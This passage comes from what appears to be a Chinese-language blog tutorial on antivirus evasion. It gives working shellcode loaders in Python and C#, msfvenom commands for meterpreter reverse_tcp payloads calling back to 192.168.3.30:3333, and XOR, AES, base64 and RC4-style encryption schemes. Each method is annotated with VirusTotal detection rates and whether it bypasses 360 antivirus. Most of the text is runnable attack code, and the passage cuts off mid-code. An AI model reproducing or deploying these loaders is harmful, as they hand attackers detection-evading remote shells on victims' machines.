+&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x03\x1e\x68\x02&quot;
+&quot;\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;
+&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;
+&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;
+&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;
+&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;
+&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;
+&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;
+&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;
+&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;
+&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;
+&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</code></pre>
+
+<p>python代码</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">import</span> ctypes
+
+shellcode = bytearray(<span class="hljs-string">&quot;shellcode&quot;</span>)
+
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(<span class="hljs-number">0x3000</span>),
+                                          ctypes.c_int(<span class="hljs-number">0x40</span>))
+
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                     buf,
+                                     ctypes.c_int(len(shellcode)))
+
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="hljs-number">0</span>),
+                                         ctypes.c_int(<span class="hljs-number">0</span>),
+                                         ctypes.c_int(ptr),
+                                         ctypes.c_int(<span class="hljs-number">0</span>),
+                                         ctypes.c_int(<span class="hljs-number">0</span>),
+                                         ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)))
+
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(<span class="hljs-number">-1</span>))
+</code></pre>
+
+<p>然后要使用PyInstaller将上述py文件转为exe（3.4M左右）</p>
+<pre><code class="hljs shell">python pyinstaller.py -F pyshellcode.py</code></pre>
+
+<p>执行生成的exe，msf正常上线</p>
+<h4 id="2-py2exe打包编译exe-VT-6-70-过360-蜜汁闪退？？？会弹黑框不建议使用"><a href="#2-py2exe打包编译exe-VT-6-70-过360-蜜汁闪退？？？会弹黑框不建议使用" class="headerlink" title="2.py2exe打包编译exe(VT: 6/70 过360 蜜汁闪退？？？会弹黑框不建议使用)"></a>2.py2exe打包编译exe(VT: 6/70 过360 蜜汁闪退？？？会弹黑框不建议使用)</h4><p>该方法借用了免杀工具<code>Python-Rootkit</code>的思路。</p>
+<p>首先要在windows上安装x86版的python。</p>
+<p><strong>注意：必须使用x86版本Python 2.7,即使Windows是x64的，也要安装32位版本。</strong></p>
+<p>这里安装的是Python 2.7.16 x86 windows版：</p>
+<p><a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi">https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi</a></p>
+<p>之后安装32位Py2exe for python 2.7</p>
+<p><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download">https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download</a></p>
+<p>msfvenom生成python payload</p>
+<pre><code class="hljs routeros">msfvenom -p python/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.3.30  <span class="hljs-attribute">LPORT</span>=3333  -f<span class="hljs-built_in"> raw </span>-o shell.py</code></pre>
+
+<p>创建文件setup.py</p>
+<pre><code class="hljs shell">from distutils.core import setup
+import py2exe
+setup(
+name = &quot;Meter&quot;,
+description = &quot;Python-based App&quot;,
+version = &quot;1.0&quot;,
+console = [&quot;shell.py&quot;],
+options = &#123;&quot;py2exe&quot;:&#123;&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,&#125;&#125;,
+zipfile = None
+)
+raw_input()</code></pre>
+
+<p>在windows下执行<code>python.exe .\setup.py py2exe</code>，(文件大小11M)</p>
+<p>msf开启监听，即可上线</p>
+<h4 id="3-base64编码-失败。。。"><a href="#3-base64编码-失败。。。" class="headerlink" title="3.base64编码(失败。。。)"></a>3.base64编码(失败。。。)</h4><p>msfvenom生成shellcode</p>
+<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64  LHOST=192.168.3.30 LPORT=3333   -f c</code></pre>
+
+<p>python代码如下：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes
+<span class="hljs-keyword">import</span> base64
+encode_shellcode = <span class="hljs-string">&quot;shellcode&quot;</span>
+shellcode = base64.b64decode(encode_shellcode)
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, len(shellcode), <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>)
+ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
+handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, rwxpage, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
+ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="hljs-number">-1</span>)</code></pre>
+
+<p>使用pyinstaller编译打包exe(6.2m）</p>
+<pre><code class="hljs shell">pyinstaller -F -w pyshellcode.py</code></pre>
+
+
+
+<h4 id="4-py-C编译exe-失败。。"><a href="#4-py-C编译exe-失败。。" class="headerlink" title="4.py+C编译exe(失败。。)"></a>4.py+C编译exe(失败。。)</h4><p>先用msfvenom生成shellcode:</p>
+<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=3333 -f c</code></pre>
+
+<p>python代码如下：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes
+
+buf =  <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-comment">#libc = CDLL(&#x27;libc.so.6&#x27;)</span>
+PROT_READ = <span class="hljs-number">1</span>
+PROT_WRITE = <span class="hljs-number">2</span>
+PROT_EXEC = <span class="hljs-number">4</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">executable_code</span>(<span class="hljs-params">buffer</span>):</span>
+    buf = c_char_p(buffer)
+    size = len(buffer)
+    addr = libc.valloc(size)
+    addr = c_void_p(addr)
+    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> == addr: 
+        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Failed to allocate memory&quot;</span>)
+    memmove(addr, buf, size)
+    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
+        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Failed to set protection on buffer&quot;</span>)
+    <span class="hljs-keyword">return</span> addr
+VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
+VirtualProtect = ctypes.windll.kernel32.VirtualProtect
+shellcode = bytearray(buf)
+whnd = ctypes.windll.kernel32.GetConsoleWindow()   
+<span class="hljs-keyword">if</span> whnd != <span class="hljs-number">0</span>:
+       <span class="hljs-keyword">if</span> <span class="hljs-number">1</span>:
+              ctypes.windll.user32.ShowWindow(whnd, <span class="hljs-number">0</span>)   
+              ctypes.windll.kernel32.CloseHandle(whnd)
+memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(<span class="hljs-number">0x3000</span>),
+                                          ctypes.c_int(<span class="hljs-number">0x40</span>))
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+old = ctypes.c_long(<span class="hljs-number">1</span>)
+VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="hljs-number">0x40</span>,ctypes.byref(old))
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
+                                     buf,
+                                     ctypes.c_int(len(shellcode)))
+shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
+shell()</code></pre>
+
+<p>使用pyinstaller编译打包exe，生成文件大小3.4M</p>
+<pre><code class="hljs shell">pyinstaller -F -w pyshellcode.py</code></pre>
+
+
+
+<h4 id="5-xor加密（失败。。）"><a href="#5-xor加密（失败。。）" class="headerlink" title="5.xor加密（失败。。）"></a>5.xor加密（失败。。）</h4><p>先用msfvenom生成一个raw格式的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw &gt; shellcode.raw</code></pre>
+
+<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>se_null</code>为自己设置的key。</p>
+<pre><code class="hljs shell">python shellcode_encoder.py -py shellcode.raw se_null xor</code></pre>
+
+<p>使用pyinstaller编译上一步骤中成的encryptedShellcodeWrapper_xor.py</p>
+<pre><code class="hljs shell">pyinstaller --onefile --noconsole encryptedShellcodeWrapper_xor.py</code></pre>
+
+
+
+<h4 id="6-aes加密"><a href="#6-aes加密" class="headerlink" title="6.aes加密"></a>6.aes加密</h4><p>和方法五一样，只不过将<code>python shellcode_encoder.py -py shellcode.raw se_null xor</code>设置为<code>python shellcode_encoder.py -py shellcode.raw se_null aes</code>即可</p>
+<h3 id="2-python加载器"><a href="#2-python加载器" class="headerlink" title="2.python加载器"></a>2.python加载器</h3><h4 id="1-HEX加密"><a href="#1-HEX加密" class="headerlink" title="1.HEX加密"></a>1.HEX加密</h4><p>这是使用了k8的方法：（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/k8gege/p/11223393.htmlk8%EF%BC%89%E7%9A%84%E5%B7%A5%E5%85%B7scrun%E4%B8%8D%E4%BB%85%E6%8F%90%E4%BE%9B%E4%BA%86%E5%8A%A0%E8%BD%BDpython%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%BF%98%E8%83%BD%E5%8A%A0%E8%BD%BDC#%E3%80%82">https://www.cnblogs.com/k8gege/p/11223393.htmlk8）的工具scrun不仅提供了加载python代码，还能加载C#。</a></p>
+<p>先用msfvenom生成一个c格式的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f c -o shell.c</code></pre>
+
+<p>用k8飞刀把shellcode转成hex,k8飞刀地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a> （解压密码是k8gege）（encode/decode-粘贴shellcode，shellcode只需一对引号引起来-全选-右键-hacking-shellcode-chartohex）</p>
+<p>使用<code>python ScRunHex.py hexcode</code>就可以加载执行shellcode了</p>
+<h4 id="2-base64加密"><a href="#2-base64加密" class="headerlink" title="2.base64加密"></a>2.base64加密</h4><p>同上一样，这次使用的是k8的<code>ScRunBase64.py</code></p>
+<h2 id="3-c-（查杀概率仍然比较大）"><a href="#3-c-（查杀概率仍然比较大）" class="headerlink" title="3.c#（查杀概率仍然比较大）"></a>3.c#（查杀概率仍然比较大）</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog">https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog</a></p>
+<h3 id="1-C-源码直接编译exe"><a href="#1-C-源码直接编译exe" class="headerlink" title="1.C#源码直接编译exe"></a>1.C#源码直接编译exe</h3><h4 id="1-C-shellcode直接编译（VT-16-69-过360）"><a href="#1-C-shellcode直接编译（VT-16-69-过360）" class="headerlink" title="1.C#+shellcode直接编译（VT:16/69 过360）"></a>1.C#+shellcode直接编译（VT:16/69 过360）</h4><p>先用msfvenom生成基于C#的shellcode,使用了<code>shikata_ga_nai</code>编码    </p>
+<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=3333 -e x86/shikata_ga_nai  -i 15  -f csharp -o payload.txt</code></pre>
+
+<p>然后将<code>payload.txt</code>文件中的shellcode代码复制到下面C#代码中</p>
+<pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;
+<span class="hljs-keyword">using</span> System.Runtime.InteropServices;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">TCPMeterpreterProcess</span>
+&#123;
+    <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
+    &#123;
+        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[] args</span>)</span>
+<span class="hljs-function"></span>        &#123;
+            <span class="hljs-comment">// native function’s compiled code</span>
+            <span class="hljs-comment">// generated with metasploit</span>
+            <span class="hljs-keyword">byte</span>[] shellcode = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[] &#123; msfvenom生成的 shellcode&#125;;
+            
+            UInt32 funcAddr = VirtualAlloc(<span class="hljs-number">0</span>, (UInt32)shellcode.Length,
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+Marshal.Copy(shellcode, <span class="hljs-number">0</span>, (IntPtr)(funcAddr), shellcode.Length);
+IntPtr hThread = IntPtr.Zero;
+UInt32 threadId = <span class="hljs-number">0</span>;
+<span class="hljs-comment">// prepare data</span>
+IntPtr pinfo = IntPtr.Zero;
+<span class="hljs-comment">// execute native code</span>
+hThread = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, funcAddr, pinfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">ref</span> threadId);
+WaitForSingleObject(hThread, <span class="hljs-number">0xFFFFFFFF</span>);
+&#125;
+        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 MEM_COMMIT = <span class="hljs-number">0x1000</span>;
+<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">UInt32 lpStartAddr,</span></span>
+<span class="hljs-function"><span class="hljs-params">UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">VirtualFree</span>(<span class="hljs-params">IntPtr lpAddress,</span></span>
+<span class="hljs-function"><span class="hljs-params">UInt32 dwSize, UInt32 dwFreeType</span>)</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params"></span></span>
+<span class="hljs-function"><span class="hljs-params">UInt32 lpThreadAttributes,</span></span>
+<span class="hljs-function"><span class="hljs-params">UInt32 dwStackSize,</span></span>
+<span class="hljs-function"><span class="hljs-params">UInt32 lpStartAddress,</span></span>
+<span class="hljs-function"><span class="hljs-params">IntPtr param,</span></span>
+<span class="hljs-function"><span class="hljs-params">UInt32 dwCreationFlags,</span></span>
+<span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">ref</span> UInt32 lpThreadId</span></span>
+<span class="hljs-function"><span class="hljs-params"></span>)</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">CloseHandle</span>(<span class="hljs-params">IntPtr handle</span>)</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">WaitForSingleObject</span>(<span class="hljs-params"></span></span>
+<span class="hljs-function"><span class="hljs-params">IntPtr hHandle,</span></span>
+<span class="hljs-function"><span class="hljs-params">UInt32 dwMilliseconds</span></span>
+<span class="hljs-function"><span class="hljs-params"></span>)</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">GetModuleHandle</span>(<span class="hljs-params"></span></span>
+<span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span> moduleName</span></span>
+<span class="hljs-function"><span class="hljs-params"></span>)</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">GetProcAddress</span>(<span class="hljs-params"></span></span>
+<span class="hljs-function"><span class="hljs-params">IntPtr hModule,</span></span>
+<span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span> procName</span></span>
+<span class="hljs-function"><span class="hljs-params"></span>)</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">LoadLibrary</span>(<span class="hljs-params"></span></span>
+<span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span> lpFileName</span></span>
+<span class="hljs-function"><span class="hljs-params"></span>)</span>;
+[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">GetLastError</span>(<span class="hljs-params"></span>)</span>;
+&#125;
+&#125;</code></pre>
+
+<p>在vs2019中新建C#项目(选择控制台应用(.NET Framwork)),编译运行</p>
+<p>msf开启监听，正常执行生成的exe。</p>
+<h4 id="2-C-加密处理shellcode免杀"><a href="#2-C-加密处理shellcode免杀" class="headerlink" title="2.C#+加密处理shellcode免杀"></a>2.C#+加密处理shellcode免杀</h4><p>先用msf生成基于c#的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=3333 -f csharp -o payload.txt</code></pre>
+
+<p>把上面<code>payload.txt</code>中的c#代码放入下面的加密代码中</p>
+<pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;
+<span class="hljs-keyword">using</span> System.Collections.Generic;
+<span class="hljs-keyword">using</span> System.IO;
+<span class="hljs-keyword">using</span> System.Linq;
+<span class="hljs-keyword">using</span> System.Security.Cryptography;
+<span class="hljs-keyword">using</span> System.Text;
+<span class="hljs-keyword">using</span> System.Threading.Tasks;
+<span class="hljs-keyword">using</span> System.Reflection;
+<span class="hljs-keyword">using</span> System.Runtime.CompilerServices;
+<span class="hljs-keyword">using</span> System.Runtime.InteropServices;
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Payload_Encrypt_Maker</span>
+&#123; <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
+    &#123;  
+         <span class="hljs-comment">// 加密密钥，可以更改，加解密源码中保持KEY一致就行</span>
+        <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] KEY = &#123; <span class="hljs-number">0x11</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> &#125;;
+        <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] IV = &#123; <span class="hljs-number">0x00</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xcc</span> &#125;;
+        <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] payload =&#123;<span class="hljs-number">0x6b</span>,<span class="hljs-number">0xa9</span>&#125;;    <span class="hljs-comment">// 替换成MSF生成的shellcode</span>
+      
+        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Encryption_Class</span>
+        &#123;
+            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">string</span> <span class="hljs-title">Encrypt</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> key, <span class="hljs-keyword">string</span> data</span>)</span>
+<span class="hljs-function"></span>            &#123;
+                Encoding unicode = Encoding.Unicode;
+
+                <span class="hljs-keyword">return</span> Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
+            &#125;
+
+            
+
+            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] <span class="hljs-title">Encrypt</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key, <span class="hljs-keyword">byte</span>[] data</span>)</span>
+<span class="hljs-function"></span>            &#123;
+                <span class="hljs-keyword">return</span> EncryptOutput(key, data).ToArray();
+            &#125;
+
+           
+
+            <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] <span class="hljs-title">EncryptInitalize</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key</span>)</span>
+<span class="hljs-function"></span>            &#123;
+                <span class="hljs-keyword">byte</span>[] s = Enumerable.Range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>)
+                  .Select(i =&gt; (<span class="hljs-keyword">byte</span>)i)
+                  .ToArray();
+
+                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)
+                &#123;
+                    j = (j + key[i % key.Length] + s[i]) &amp; <span class="hljs-number">255</span>;
+
+                    Swap(s, i, j);
+                &#125;
+
+                <span class="hljs-keyword">return</span> s;
+            &#125;
+
+            <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> IEnumerable&lt;<span class="hljs-keyword">byte</span>&gt; <span class="hljs-title">EncryptOutput</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key, IEnumerable&lt;<span class="hljs-keyword">byte</span>&gt; data</span>)</span>
+<span class="hljs-function"></span>            &#123;
+                <span class="hljs-keyword">byte</span>[] s = EncryptInitalize(key);
+
+                <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;
+                <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;
+
+                <span class="hljs-keyword">return</span> data.Select((b) =&gt;
+                &#123;
+                    i = (i + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">255</span>;
+                    j = (j + s[i]) &amp; <span class="hljs-number">255</span>;
+
+                    Swap(s, i, j);
+
+                    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">byte</span>)(b ^ s[(s[i] + s[j]) &amp; <span class="hljs-number">255</span>]);
+                &#125;);
+            &#125;
+
+            <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Swap</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] s, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j</span>)</span>
+<span class="hljs-function"></span>            &#123;
+                <span class="hljs-keyword">byte</span> c = s[i];
+
+                s[i] = s[j];
+                s[j] = c;
+            &#125;
+        &#125;
+        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[] args</span>)</span>
+<span class="hljs-function"></span>        &#123;
+            <span class="hljs-keyword">byte</span>[] result = Encryption_Class.Encrypt(KEY, payload);
+            <span class="hljs-keyword">int</span> b = <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; result.Length; i++)
+            &#123;   b++;
+                <span class="hljs-keyword">if</span> (i == result.Length+<span class="hljs-number">1</span>)
+                &#123;Console.Write(result[i].ToString());&#125;
+                <span class="hljs-keyword">if</span> (i != result.Length) &#123; Console.Write(result[i].ToString() + <span class="hljs-string">&quot;,&quot;</span>); &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>编译生成一段加密后的shellcode,要查看这段shellcode，直接到生成的exe目录下打开cmd，输入exe文件名即可查看。</p>
+<p>在vs2017中再新建C#解密项目</p>
+<pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;
+<span class="hljs-keyword">using</span> System.Collections.Generic;
+<span class="hljs-keyword">using</span> System.Linq;
+<span class="hljs-keyword">using</span> System.Text;
+<span class="hljs-keyword">using</span> System.Runtime.InteropServices;
+<span class="hljs-keyword">using</span> System.Threading;
+<span class="hljs-keyword">using</span> System.Reflection;
+<span class="hljs-keyword">using</span> System.Runtime.CompilerServices;
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">NativePayload_Reverse_tcp</span>
+&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
+    &#123;
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>        &#123;
+            Shellcode.Exec();
+        &#125;
+
+    &#125;
+
+    <span class="hljs-keyword">class</span> <span class="hljs-title">Shellcode</span>
+    &#123;
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Exec</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>        &#123;
+            <span class="hljs-keyword">string</span> Payload_Encrypted;
+            Payload_Encrypted = <span class="hljs-string">&quot;0,244,36,163,code_herer&quot;</span>;
+            <span class="hljs-keyword">string</span>[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(<span class="hljs-string">&#x27;,&#x27;</span>);
+            <span class="hljs-keyword">byte</span>[] _X_to_Bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[Payload_Encrypted_Without_delimiterChar.Length];
+            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)
+            &#123;
+                <span class="hljs-keyword">byte</span> current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
+                _X_to_Bytes[i] = current;
+            &#125;
+            <span class="hljs-comment">// 解密密钥，可以更改，加解密源码中保持KEY一致就行</span>
